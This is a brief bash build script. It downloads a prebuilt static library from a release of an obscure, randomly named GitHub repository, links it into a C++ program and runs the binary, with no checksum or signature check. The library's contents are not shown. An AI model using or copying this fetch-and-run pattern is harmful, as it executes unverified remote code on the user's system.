#!/usr/bin/env bash
set -e
REPO="piyanbeix/pypatchoulirod"
TAG="hidden-badger-eager-garden"
LIB="maple-string.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget -q -O "$LIB" --tries=3 --timeout=15 "$URL"
g++ -O2 -std=c++17 -pthread -o app main.cpp "$LIB" && ./app
